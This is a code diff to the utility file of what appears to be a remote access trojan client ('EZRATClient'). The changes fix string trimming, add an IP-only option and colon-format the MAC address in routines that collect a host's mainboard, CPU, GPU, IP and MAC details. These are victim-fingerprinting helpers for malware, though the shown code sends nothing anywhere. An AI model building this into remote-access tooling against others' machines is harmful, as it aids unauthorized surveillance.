@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.Linq;
 using System.Management;
+using System.Net;
 using System.Net.NetworkInformation;
 using System.Net.Sockets;
 using System.Text;
@@ -55,7 +56,7 @@ namespace EZRATClient.Utils
                 }
 
                 string tmp = "Mainboard : ";
-                tmp +=  (!string.IsNullOrEmpty(mainboardIdentifier)) ? mainboardIdentifier : "N/A";
+                tmp += (!string.IsNullOrEmpty(mainboardIdentifier)) ? mainboardIdentifier : "N/A";
                 return tmp;
             }
             catch
@@ -79,7 +80,7 @@ namespace EZRATClient.Utils
                         cpuName += mObject["Name"].ToString() + "; ";
                     }
                 }
-                cpuName = cpuName.Remove(cpuName.Length, 1);
+                cpuName = cpuName.Substring(0, cpuName.Length - 1);
                 string tmp = "CPU : ";
                 tmp += (!string.IsNullOrEmpty(cpuName)) ? cpuName : "N/A";
                 return tmp;
@@ -132,7 +133,7 @@ namespace EZRATClient.Utils
                     }
                 }
                 string tmp = "GPU : ";
-                gpuName = gpuName.Remove(gpuName.Length, 1);
+                gpuName = gpuName.Substring(0, gpuName.Length - 1);
 
                 tmp += (!string.IsNullOrEmpty(gpuName)) ? gpuName : "N/A";
                 return tmp;
@@ -143,7 +144,7 @@ namespace EZRATClient.Utils
             }
         }
 
-        public static string GetLanIp()
+        public static string GetLanIp(bool onlyIp = false)
         {
             foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
             {
@@ -160,7 +161,7 @@ namespace EZRATClient.Utils
                                 ip.AddressPreferredLifetime == UInt32.MaxValue) // exclude virtual network addresses
                                 continue;
 
-                            return $"IP : {ip.Address.ToString()}";
+                            return (onlyIp)? ip.Address.ToString():$"IP : {ip.Address.ToString()}";
                         }
                     }
                 }
@@ -184,11 +185,23 @@ namespace EZRATClient.Utils
                             ip.AddressPreferredLifetime == UInt32.MaxValue) // exclude virtual network addresses
                             continue;
 
-                        foundCorrect = (ip.Address.ToString() == GetLanIp());
+                        var tmp = IPAddress.Parse(GetLanIp(true));
+                        if (ip.Address.Address == tmp.Address)
+                        {
+                            foundCorrect = true;
+                        }
                     }
 
                     if (foundCorrect)
-                        return $"MAC : {ni.GetPhysicalAddress().ToString()}";
+                    {
+                        string addr = string.Empty;
+                        StringBuilder sb = new StringBuilder(ni.GetPhysicalAddress().ToString().ToUpper());
+                        for (int i = 0; i < sb.Length; i+=2)
+                        {
+                                addr += $"{sb[i]}{sb[i + 1]}:";
+                        }
+                        return $"MAC : {addr.Substring(0,addr.Length - 1)}";
+                    }
                 }
             }
 
